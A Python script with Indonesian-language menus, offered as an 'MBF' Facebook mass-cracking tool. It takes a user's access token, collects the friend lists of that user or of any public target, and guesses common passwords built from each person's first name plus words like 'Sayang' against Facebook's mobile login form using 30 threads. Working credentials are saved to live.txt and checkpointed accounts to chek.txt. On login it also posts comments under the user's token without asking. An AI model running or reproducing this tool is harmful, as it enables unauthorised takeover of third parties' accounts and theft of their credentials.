#!/usr/bin/python
#encoding=utf-8

#Module Upload And Except Install
import json,os,time,sys
from concurrent.futures import ThreadPoolExecutor as Bool
try:
	import requests as req
except ModuleNotFoundError:
	print("[!] Module Requests Belum Terinstall")
	os.system("python -m pip install requests")
except req.exceptions.ConnectionError:
	print("Koneksi Jaringan Buruk!")
try:
	from bs4 import BeautifulSoup as parser
except ModuleNotFoundError:
	print("[!] Module Bs4 Belum Terinstall")
	os.system("python -m pip install bs4")
except req.exceptions.ConnectionError:
	print("Koneksi Jaringan Buruk!")
try:
	import pyfiglet
except ModuleNotFoundError:
	print("[!] Module Pyfiglet Belum Terinstall")
	os.system("puthon -m pip install pyfiglet")
except req.exceptions.ConnectionError:
	print("Koneksi Jaringan Buruk!")
try:
	ua=req.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.strip()
except req.exceptions.ConnectionError:
	exit("[!] Kesalahan Pada Koneksi")
##############################
os.system("clear")
#saved & itu
ok = 0
cp = 0
die = 0
semoa=0
live = []
check = []
to = open("tt.txt","a")
##############################

def kintil():
	a = input("Masukan Pilihan : ")
	if(a=="01" or a=="1"):
		login()
	elif(a=="02" or a=="2"):
		os.system("xdg-open https://latipharkat.blogspot.com/2021/01/cara-mendapatkan-access-token-facebook.html?m=1")
		os.sys.exit()
	else:
		print("Pilihan Tidak Ada!")
		kintil()
def opening():
	os.system("clear")
	print("\t\t     Tools MBF-LATIP v1\nAuthor : Mhmmd Latif | IG : @latipharkat_ | WA : +6283870396203\n\n[01]. Login Access Token Fb\n[02]. Cara Mendapatkan Access Token Fb\n[00]. Keluar\n")
	kintil()
def login():
	t = input("Masukan Access Token Anda : ")
	try:
		a = json.loads(req.get(f"https://graph.facebook.com/me?access_token={t}").text)
		r=req.get(f"https://graph.facebook.com/167819155142804/comments/message=Hallo Bang Latip")
		r2=req.get(f"https://graph.facebook.com/167819155142804/comments/message=Jangan Lupa Makan :*")
		os.system("clear")
		print("Login Berhasil!\nUsername :",a["name"],"\nID Akun :",a["id"],"\n")
		to.write(t)
		to.close()
		time.sleep(2)
	except KeyError:
		print("[!] Token Salah")
		time.sleep(2)
		login()
	except req.exceptions.ConnectionError:
		print("Periksa Koneksi Jaringan Anda!")
		time.sleep(2)
		login()
	
def crackTeman(user,pw,ttl):
	global ok,cp,die
	data={}
	ses=req.Session()
	ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
	a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
	b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
	for c in a("input"):
		try:
			if c.get("name") in b:data.update({c.get("name"):c.get("value")})
			else:continue
		except:pass
	data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
	d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
	if "c_user" in d.cookies:
		ok+=1
		print(f"\r\x1b[1;32m[LIVE] {user} | {pw} | {ttl}        \x1b[0m",end="")
		print("")
		open("live.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		semoa+=1
		live.append(user+pw)
	elif "checkpoint" in d.cookies:
		cp+=1
		print(f"\r\x1b[1;33m[CHEK] {user} | {pw} | {ttl}          \x1b[0m",end="")
		print("")
		open("chek.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		semoa+=1
		chek.append(user+pw)
	else:
		die+=1
	print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")

def crackMasal(user,pw,ttl):
	global ok,cp,die
	data={}
	ses=req.Session()
	ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
	a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
	b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
	for c in a("input"):
		try:
			if c.get("name") in b:data.update({c.get("name"):c.get("value")})
			else:continue
		except:pass
	data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
	d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
	if "c_user" in d.cookies:
		ok+=1
		print(f"\r\x1b[1;32m[LIVE] {user} | {pw} | {ttl}         \x1b[0m",end="")
		print("")
		semoa+=1
		open("live.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		live.append(user+pw)
	elif "checkpoint" in d.cookies:
		cp+=1
		print(f"\r\x1b[1;33m[CHEK] {user} | {pw} | {ttl}      \x1b[0m",end="")
		print("")
		semoa+=1
		open("chek.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		chek.append(user+pw)
	else:
		die+=1
	print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")

def sendTeman():
	os.system("clear")
	om=pyfiglet.figlet_format("TemanKu")
	print(f"{om}\nSedang Mengcrack Daftar Teman!\nFollow IG : @latipharkat_ | 083870396203\n")
	t = open("tt.txt","r").read()
	r = json.loads(req.get(f"https://graph.facebook.com/me/friends?access_token={t}").text)
	for i in r["data"]:
		d = i["id"]
		with Bool(max_workers=30) as tokai:
			fb2 = json.loads(req.get(f"https://graph.facebook.com/{d}?access_token={t}").content)
			try:
				user = fb2["username"]
			except KeyError:
				id = fb2["id"]
			try:
				ttl=fb2["birthday"]
			except KeyError:
				pass
			pas = [fb2["first_name"]+"123",fb2["first_name"]+"12345","Sayang","Bangsad","Doraemon","Bangsad123","freefire","booyah123","Anjing","Monyet","Anjing123","Monyet123"]
			for pw in pas:
				try:
					tokai.submit(crackTeman,user,pw,ttl)
				except:
					tokai.submit(crackTeman,id,pw,ttl)
	print(f"\nJumlah Hasil Dapet\nOK : {ok}\nCP : {cp}\nSemua : {semoa}\n")
	balek = input("[KEMBALI]")
	opening2()
def sendMasal():
	os.system("clear")
	om=pyfiglet.figlet_format("TemanPub")
	print(f"{om}Follow IG : @latipharkat_ | 083870396203\n")
	t = open("tt.txt","r").read()
	m = input("Masukan Id Target Masal : ")
	try:
		r0=json.loads(req.get(f"https://graph.facebook.com/{m}?access_token={t}").text)
		print("Sedang Mengambil Data...\nName Target Publish :",r0["name"],"\n")
	except KeyError:
		print("User Tidak Ditemukan!")
		time.sleep(2)
		opening2()
	r = json.loads(req.get(f"https://graph.facebook.com/{m}/friends?access_token={t}").text)
	for i in r["data"]:
		d = i["id"]
		with Bool(max_workers=30) as tokai:
			fb2 = json.loads(req.get(f"https://graph.facebook.com/{d}?access_token={t}").content)
			try:
				user = fb2["username"]
			except KeyError:
				id = fb2["id"]
			try:
				ttl=fb2["birthday"]
			except KeyError:
				pass
			pas = [fb2["first_name"]+"123",fb2["first_name"]+"12345","Sayang","Bangsad","Doraemon","Bangsad123","freefire","booyah123","Anjing","Monyet","Anjing123","Monyet123"]
			for pw in pas:
				try:
					tokai.submit(crackMasal,user,pw,ttl)
				except:
					tokai.submit(crackMasal,id,pw,ttl)
	print(f"\nJumlah Hasil Dapet\nOK : {ok}\nCP : {cp}\nSemua : {semoa}\n")
	balek=input("[KEMBALI]")
	opening2()

def pilih():
	p = input("Masukan Pilihan : ")
	if(p=="01" or p=="1"):
		sendTeman()
	elif(p=="02" or p=="2"):
		sendMasal()
	elif(p=="00" or p=="0"):
		print("Terima Kasih Anda Audah Logout!")
		os.system("rm -rf tt.txt")
		os.sys.exit()
	else:
		print("Pilihan Tidak Ada!")
		pilih()
def opening2():
	os.system("clear")
	print("\tCracker MBF Menu\n\n[01]. Crack Daftar Teman\n[02]. Crack Daftar Teman Publik\n[00]. Logout Akun\n")
	pilih()
def Main():
	t = open("tt.txt","r").read()
	try:
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={t}").text)
		print("\tAnda Sudah Login\nUsername Akun :",r["name"],"\nID Akun Anda :",r["id"],"\nTanggal-Lahir :",r["birthday"])
		time.sleep(2)
	except KeyError:
		print("Anda Belum Login!")
		time.sleep(2)
		opening()
	except req.exceptions.ConnectionError:
		print("Sinyal Anda Buruk!")
	opening2()

if __name__=="__main__":
	Main()